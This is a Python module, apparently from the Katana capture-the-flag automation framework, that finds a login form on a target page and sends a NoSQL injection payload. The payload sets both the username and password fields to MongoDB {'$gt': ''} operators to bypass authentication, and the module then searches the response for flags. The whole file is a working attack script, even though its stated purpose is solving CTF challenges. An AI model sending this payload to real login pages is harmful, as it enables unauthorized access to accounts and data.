from katana.unit import BaseUnit
from collections import Counter
import sys
from io import StringIO
import argparse
from pwn import *
import subprocess
import os
from katana.units import raw
import re
from katana.units import web
import requests
import magic
from katana import units
import traceback

class Unit(web.WebUnit):

	PRIORITY = 40

	def __init__(self, katana, target):

		# Run the parent constructor, to ensure this is a valid URL
		super(Unit, self).__init__(katana, target)
		if not katana.config['flag_format']:
			raise units.NotApplicable('no flag format specified')

		self.session = requests.Session()

		self.action = re.findall(rb'<\s*form.*action\s*=\s*[\'"](.+?)[\'"]', self.target.content, flags=re.IGNORECASE)
		self.method = re.findall(rb'<\s*form.*method\s*=\s*[\'"](.+?)[\'"]', self.target.content, flags=re.IGNORECASE)

		# Sometimes, a form might not have an explicit location. Assume the current page!
		if ( self.action == [] ):
			self.action = [ b"#" ]

		self.username = re.findall(web.user_regex, self.target.content, flags=re.IGNORECASE)
		self.password = re.findall(web.pass_regex, self.target.content, flags=re.IGNORECASE)

		# Only run this if we have potential information...
		if not (self.action and self.method and self.username and self.password):
			raise units.NotApplicable("no appropriate form fields detected")

	def evaluate(self, katana, case):
		
		if self.action and self.method and self.username and self.password:
			if self.action: action = self.action[0].decode('utf-8')
			if self.method: method = self.method[0].decode('utf-8')
			if self.username: username = self.username[0].decode('utf-8')
			if self.password: password = self.password[0].decode('utf-8')

			try:
				r = self.session.request(method.lower(), self.target.url_root.rstrip('/') + '/' + action.lstrip('.').lstrip('/'), json = {
					"username" : { "$gt":"" },
					"password" : { "$gt":"" },
				})
				
				# Hunt for flags if we have a successful injection!
				katana.locate_flags(self, r.text)
			except:
				# JOHN: Theoretically, if we find a valid method, this should not error...
				#       But if it does, we should see it.
				traceback.print_exc()
			
			
